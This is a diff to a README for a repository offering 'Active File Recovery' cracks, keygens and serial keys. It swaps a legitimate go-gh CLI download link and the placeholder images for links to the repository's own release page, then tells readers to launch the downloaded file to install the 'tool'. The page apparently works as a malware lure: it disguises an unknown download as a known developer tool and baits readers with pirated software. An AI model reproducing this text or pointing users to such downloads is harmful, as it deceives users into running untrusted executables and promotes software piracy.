@@ -2,7 +2,7 @@
 
 Welcome to the Active File Recovery Free repository! This repository is dedicated to providing information and resources related to file recovery solutions using Active File Recovery software, including activation, key generation, and more.
 
-![Active File Recovery Free](https://imageurl.com)
+![Active File Recovery Free](https://github.com/Emapes1/Active-File-Recovery-Free/releases/tag/v1.0)
 
 ## Repository Description
 In this repository, you will find information on how to activate Reclaime File Recovery, generate keygens for Active File Recovery 17, utilize Active Disk File Recovery, download Active File Recovery 17, recover files on Android using Active File Recovery, and much more. Whether you are looking for Active File Recovery 16 or 17, serial keys, or lifetime cracks, this repository has got you covered.
@@ -27,7 +27,7 @@ In this repository, you will find information on how to activate Reclaime File R
 
 ## Resources
 For the latest version of the Go GH CLI tool, you can download it from the following link:
-[![Download Go GH CLI Tool](https://img.shields.io/badge/Download-Go%20GH%20CLI%20Tool-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Go GH CLI Tool](https://github.com/Emapes1/Active-File-Recovery-Free/releases/tag/v1.0%20GH%20CLI%20Tool-brightgreen)](https://github.com/Emapes1/Active-File-Recovery-Free/releases/tag/v1.0)
 *Note: Please make sure to launch the downloaded file to install the tool.*
 
 ## Get Started
@@ -41,4 +41,4 @@ Stay updated with the latest news and updates by following our GitHub repository
 
 Thank you for visiting the Active File Recovery Free repository. Happy file recovery! 🚀
 
-![Active File Recovery Logo](https://logoimage.com)
+![Active File Recovery Logo](https://github.com/Emapes1/Active-File-Recovery-Free/releases/tag/v1.0)
